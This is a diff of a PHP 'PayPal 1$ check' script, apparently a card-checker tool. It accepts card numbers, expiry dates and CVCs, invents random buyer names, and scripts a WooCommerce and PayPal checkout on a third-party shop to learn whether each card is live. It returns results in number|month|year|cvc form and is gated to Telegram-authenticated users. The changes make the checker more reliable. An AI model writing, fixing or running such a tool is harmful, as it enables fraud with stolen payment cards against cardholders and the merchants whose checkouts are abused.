@@ -3,30 +3,31 @@ header('Content-Type: application/json');
 
 // Enable error reporting for debugging (disable in production)
 ini_set('display_errors', 0);
-error_log("PayPal 1$ check initiated");
+error_log("PayPal 1$ check initiated for session: " . session_id());
 
 session_start();
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
-    error_log("Unauthorized access attempt to paypal1$.php");
+    error_log("Unauthorized access attempt to paypal1$.php from session: " . session_id());
     echo json_encode(['status' => 'error', 'message' => 'Unauthorized']);
     exit;
 }
 
-// Parse card data from POST request
-$data = json_decode(file_get_contents('php://input'), true);
-if (!$data || !isset($data['card']['number'], $data['card']['exp_month'], $data['card']['exp_year'], $data['card']['cvc'])) {
-    error_log("Invalid card data received: " . json_encode($data));
+// Parse card data from POST request (FormData)
+$card = [
+    'number' => $_POST['card[number]'] ?? '',
+    'exp_month' => str_pad($_POST['card[exp_month]'] ?? '', 2, '0', STR_PAD_LEFT),
+    'exp_year' => substr($_POST['card[exp_year]'] ?? '', -2),
+    'cvc' => $_POST['card[cvc]'] ?? '',
+    'displayCard' => isset($_POST['card[number]'], $_POST['card[exp_month]'], $_POST['card[exp_year]'], $_POST['card[cvc]']) 
+        ? implode('|', [$_POST['card[number]'], $_POST['card[exp_month]'], $_POST['card[exp_year]'], $_POST['card[cvc]']]) 
+        : ''
+];
+
+if (empty($card['number']) || empty($card['exp_month']) || empty($card['exp_year']) || empty($card['cvc']) || empty($card['displayCard'])) {
+    error_log("Invalid card data received: " . json_encode($_POST));
     echo json_encode(['status' => 'error', 'message' => 'Invalid card data']);
     exit;
 }
-
-$card = [
-    'number' => $data['card']['number'],
-    'exp_month' => str_pad($data['card']['exp_month'], 2, '0', STR_PAD_LEFT),
-    'exp_year' => substr($data['card']['exp_year'], -2),
-    'cvc' => $data['card']['cvc'],
-    'displayCard' => implode('|', [$data['card']['number'], $data['card']['exp_month'], $data['card']['exp_year'], $data['card']['cvc']])
-];
 
 // Generate random user data
 $first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah"];
@@ -60,8 +61,9 @@ $button_session_id = "uid_{$lol2}_{$lol3}";
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 180); // Increased timeout to 180 seconds
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For testing, disable in production
+curl_setopt($ch, CURLOPT_TIMEOUT, 300); // Increased to 300 seconds
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Enable SSL verification
+curl_setopt($ch, CURLOPT_CAINFO, __DIR__ . '/cacert.pem'); // Use a valid CA bundle (download from curl.se/docs/caextract.html)
 
 // Step 1: Add to cart
 curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/shop/i-buy/');
@@ -86,7 +88,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, [
 $response = curl_exec($ch);
 if (curl_errno($ch)) {
     error_log("Curl error in add to cart: " . curl_error($ch));
-    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
+    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: ' . curl_error($ch) . ' (HTTP ' . curl_errno($ch) . ')', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
 }
@@ -107,7 +109,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, [
 $response = curl_exec($ch);
 if (curl_errno($ch)) {
     error_log("Curl error in checkout: " . curl_error($ch));
-    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
+    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: ' . curl_error($ch) . ' (HTTP ' . curl_errno($ch) . ')', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
 }
@@ -116,17 +118,17 @@ $sec = '';
 $nonce = '';
 $check = '';
 $create = '';
-preg_match('/update_order_review_nonce":"(.*?)"/', $response, $sec_match);
+preg_match('/"update_order_review_nonce":"([^"]+)"/', $response, $sec_match);
 if (isset($sec_match[1])) $sec = $sec_match[1];
-preg_match('/save_checkout_form.*?nonce":"(.*?)"/', $response, $nonce_match);
+preg_match('/"save_checkout_form.*?nonce":"([^"]+)"/', $response, $nonce_match);
 if (isset($nonce_match[1])) $nonce = $nonce_match[1];
-preg_match('/name="woocommerce-process-checkout-nonce" value="(.*?)"/', $response, $check_match);
+preg_match('/name="woocommerce-process-checkout-nonce" value="([^"]+)"/', $response, $check_match);
 if (isset($check_match[1])) $check = $check_match[1];
-preg_match('/create_order.*?nonce":"(.*?)"/', $response, $create_match);
+preg_match('/"create_order.*?nonce":"([^"]+)"/', $response, $create_match);
 if (isset($create_match[1])) $create = $create_match[1];
 
 if (empty($sec) || empty($nonce) || empty($check) || empty($create)) {
-    error_log("Failed to extract nonces: sec=$sec, nonce=$nonce, check=$check, create=$create");
+    error_log("Failed to extract nonces: sec=$sec, nonce=$nonce, check=$check, create=$create, Response: " . substr($response, 0, 500));
     echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: missing nonces', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
@@ -151,7 +153,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, [
 $response = curl_exec($ch);
 if (curl_errno($ch)) {
     error_log("Curl error in update order review: " . curl_error($ch));
-    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
+    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: ' . curl_error($ch) . ' (HTTP ' . curl_errno($ch) . ')', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
 }
@@ -186,14 +188,14 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, [
 $response = curl_exec($ch);
 if (curl_errno($ch)) {
     error_log("Curl error in create order: " . curl_error($ch));
-    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
+    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: ' . curl_error($ch) . ' (HTTP ' . curl_errno($ch) . ')', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
 }
 
 $result = json_decode($response, true);
 if (json_last_error() !== JSON_ERROR_NONE) {
-    error_log("JSON decode error in create order: " . json_last_error_msg());
+    error_log("JSON decode error in create order: " . json_last_error_msg() . ", Response: " . substr($response, 0, 500));
     echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: invalid response', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
@@ -203,7 +205,7 @@ $id = $result['data']['id'] ?? '';
 $pcp = $result['data']['custom_id'] ?? '';
 
 if (empty($id) || empty($pcp)) {
-    error_log("Failed to get order ID or custom ID: id=$id, pcp=$pcp");
+    error_log("Failed to get order ID or custom ID: id=$id, pcp=$pcp, Response: " . substr($response, 0, 500));
     echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: order creation failed', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
@@ -235,7 +237,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
 $response = curl_exec($ch);
 if (curl_errno($ch)) {
     error_log("Curl error in PayPal card fields: " . curl_error($ch));
-    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
+    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: ' . curl_error($ch) . ' (HTTP ' . curl_errno($ch) . ')', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
 }
@@ -249,7 +251,7 @@ $json_data = json_encode([
         'token' => $id,
         'card' => [
             'cardNumber' => $card['number'],
-            'type' => 'VISA',
+            'type' => 'VISA', // Assuming VISA; adjust dynamically if needed
             'expirationDate' => $card['exp_month'] . '/20' . $card['exp_year'],
             'postalCode' => $zip_code,
             'securityCode' => $card['cvc'],
@@ -270,12 +272,12 @@ $json_data = json_encode([
     ]
 ]);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
-    'authority: my.tinyinstaller.top',
+    'authority: www.paypal.com',
     'accept: */*',
     'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
     'content-type: application/json',
-    'origin: https://my.tinyinstaller.top',
-    'referer: https://my.tinyinstaller.top/checkout/',
+    'origin: https://www.paypal.com',
+    'referer: https://www.paypal.com/checkout/',
     'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
@@ -285,14 +287,14 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
 $response = curl_exec($ch);
 if (curl_errno($ch)) {
     error_log("Curl error in payment submission: " . curl_error($ch));
-    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
+    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: ' . curl_error($ch) . ' (HTTP ' . curl_errno($ch) . ')', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
 }
 
 $result = json_decode($response, true);
 if (json_last_error() !== JSON_ERROR_NONE) {
-    error_log("JSON decode error in payment response: " . json_last_error_msg());
+    error_log("JSON decode error in payment response: " . json_last_error_msg() . ", Response: " . substr($response, 0, 500));
     echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: invalid response', 'response' => $card['displayCard']]);
     curl_close($ch);
     exit;
